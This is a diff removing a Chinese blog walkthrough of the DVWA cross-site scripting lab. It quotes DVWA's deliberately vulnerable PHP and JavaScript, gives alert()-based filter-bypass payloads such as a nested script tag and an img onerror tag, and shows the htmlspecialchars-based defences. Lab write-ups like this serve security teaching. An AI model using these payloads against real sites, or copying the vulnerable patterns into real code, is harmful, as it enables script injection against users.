-<li>设置白名单，只有规定的几种选项可以输入。</li>
-<li>若不在白名单内，默认设置为<code>English</code>。</li>
-</ul>
-<h4 id="攻击-2">攻击</h4>
-<ul>
-<li>使用<code>&amp;</code>或者<code>#</code>分隔参数，<code>$_GET['default']</code>指向分隔符之前的内容，参与后端判断语句。</li>
-<li>根据前端代码可知，分隔符之后的内容也会载入到前端页面中，故可实现恶意代码的注入。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210220150402623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" /></li>
-</ul>
-<h3 id="防御">防御</h3>
-<h4 id="代码-3">代码</h4>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">            document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;French&quot;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Spanish&quot;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;German&quot;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-3">审计</h4>
-<ul>
-<li>之前的恶意代码之所以能够运行就是因为在呈现页面元素时，将<code>URL</code>中已经编好码的参数使用<code>decodeURI()</code>解码，解码后的代码才可以执行。</li>
-<li>前端不解码直接呈现参数<code>lang</code>，导致恶意代码编码后无法被解析。</li>
-</ul>
-<h2 id="reflected">Reflected</h2>
-<h3 id="介绍-1">介绍</h3>
-<ul>
-<li>攻击者构造<font color=red>恶意链接</font>诱骗受害者点击，受害者点击后便触发恶意代码运行，完成攻击。</li>
-</ul>
-<h3 id="low-1">Low</h3>
-<h4 id="代码-4">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-4">审计</h4>
-<ul>
-<li>前端负责输入，后端接收到<code>name</code>参数后没有防范措施，直接打印在屏幕上。</li>
-</ul>
-<h4 id="攻击-3">攻击</h4>
-<ul>
-<li>直接输入<code>XSS</code>语句即可。</li>
-</ul>
-<h3 id="medium-1">Medium</h3>
-<h4 id="代码-5">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-5">审计</h4>
-<ul>
-<li>使用<code>str_replace()</code>函数，将<code>&lt;script&gt;</code>过滤后打印。</li>
-</ul>
-<h4 id="攻击-4">攻击</h4>
-<ul>
-<li>借用<code>str_replace</code>的过滤机制，<code>&lt;script&gt;</code>被替换为空字符串，构造<code>Payload</code>。</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><img src="https://img-blog.csdnimg.cn/20210220150606130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" /></li>
-</ul>
-<h3 id="high">High</h3>
-<h4 id="代码-6">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-6">审计</h4>
-<ul>
-<li>使用正则表达式过滤法，杜绝了构造<code>&lt;script&gt;</code>的方法。</li>
-<li>黑名单太过单一，可以使用其他标签进行注入。</li>
-</ul>
-<h4 id="攻击-5">攻击</h4>
-<ul>
-<li>使用<code>&lt;img&gt;</code>元素，<code>Payload</code>如下。</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="防御-1">防御</h3>
-<h4 id="代码-7">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-7">审计</h4>
-<ul>
-<li>日常<code>check token</code>。</li>
-<li><code>htmlspecialchars()</code>函数将<code>name</code>参数转化后，代码无法运行。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210220150716617.png" /></li>
-</ul>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/htmlspecialchars/">htmlspecialchars</a>( string <code>$string</code> , int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 , string <code>$encoding</code> = ini_get("default_charset") , bool <code>$double_encode</code> = <strong><code>true</code></strong> ) : string将特殊字符转换为<code>HTML</code>实体。</p>
-</blockquote>
-<h2 id="stored">Stored</h2>
-<h3 id="介绍-2">介绍</h3>
-<ul>
-<li>攻击者将恶意代码上传到服务器端存储(如评论区)，每当服务器展示时，恶意代码都会运行。</li>
-</ul>
-<h3 id="low-2">Low</h3>
-<h4 id="代码-8">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-8">审计</h4>
-<ul>
-<li>对<code>name</code>和<code>message</code>参数进行修剪，去除多余字符。</li>
-<li>在前端页面对<code>name</code>的大小限制为<code>10</code>个字符，对<code>message</code>限制为<code>50</code>个字符。</li>
-<li>使用<code>stripslashes()</code>函数对<code>message</code>进行转义字符过滤，预防<code>SQL</code>注入。</li>
-</ul>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/trim">trim</a>( string <code>$str</code> , string <code>$character_mask</code> = " 0B" ) : string除去以下特殊字符。</p>
-<table>
-<thead>
-<tr class="header">
-<th>字符</th>
-<th>意义</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>" "</td>
-<td>空格</td>
-</tr>
-<tr class="even">
-<td>"</td>
-<td>制表符</td>
-</tr>
-<tr class="odd">
-<td>""</td>
-<td>换行符</td>
-</tr>
-<tr class="even">
-<td>"</td>
-<td>回车符</td>
-</tr>
-<tr class="odd">
-<td>"\0"</td>
-<td>空字节符</td>
-</tr>
-<tr class="even">
-<td>"0B"</td>
-<td>垂直制表符</td>
-</tr>
-</tbody>
-</table>
-</blockquote>
-<h4 id="攻击-6">攻击</h4>
-<ul>
-<li><code>name</code>限制太大，只能从<code>message</code>下手，并且没有任何<code>XSS</code>防御手段，直接键入<code>XSS</code>语句即可。</li>
-</ul>
-<h3 id="medium-2">Medium</h3>
-<h4 id="代码-9">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
-<h4 id="审计-9">审计</h4>
-<ul>
-<li>使用 <code>addslashes()</code>函数对 <code>message</code> 中的某些字符进行过滤。</li>
-<li>使用 <code>strip_tags()</code> 函数去除标签。</li>
-<li>对<code>name</code>中的<code>&lt;script&gt;</code>标签进行屏蔽。</li>
-</ul>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags</a>( string <code>$str</code> , string <code>$allowable_tags</code> = ? ) : string从字符串 <code>str</code> 中去除 <code>HTML</code> 和 <code>PHP</code> 标签。</p>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.addslashes.php">addslashes</a>( string <code>$str</code> ) : string在字符串 <code>str</code> 中的单引号（<code>'</code>）、双引号（<code>"</code>）、反斜线（<code>\</code>）与 <code>NUL</code>（<strong><code>null</code></strong> 字符）前，加上反斜线（<code>\</code>）转义。</p>
-</blockquote>
-<h4 id="攻击-7">攻击</h4>
-<ul>
-<li><code>message</code>这个注入点被完全屏蔽了，但是<code>name</code>只是简单过滤，于是从<code>name</code>下手。</li>
-<li>前端对<code>name</code>限制了文本长度，打开<code>F12</code>修改前端限制。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210220151013563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" /></li>
-<li>使用<code>name</code>作为注入点，对<code>&lt;script&gt;</code>的屏蔽构造<code>Payload</code>。</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">ipt&gt;alert(&#x27;XSS&#x27;);&lt;/scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="high-1">High</h3>
-<h4 id="代码-10">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
-<h4 id="审计-10">审计</h4>
-<ul>
-<li>知道<code>Medium</code>会放过<code>name</code>注入后，对<code>&lt;script&gt;</code>进行了正则表达式的完全屏蔽。</li>
-</ul>
-<h4 id="攻击-8">攻击</h4>
-<ul>
-<li>屏蔽了<code>&lt;script&gt;</code>标签后，使用其他标签注入<code>XSS</code>语句即可。</li>
-</ul>
-<h3 id="防御-2">防御</h3>
-<h4 id="代码-11">代码</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="审计-11">审计</h4>
-<ul>
-<li>日常<code>check token</code>。</li>
-<li>在<code>Medium</code>的基础上，对<code>name</code>施加同<code>message</code>一样的过滤，使得注入点消失。</li>
-<li>使用<code>PDO</code>机制预防<code>SQL</code>注入。</li>
-</ul>
-
+        
       
     </div>
 
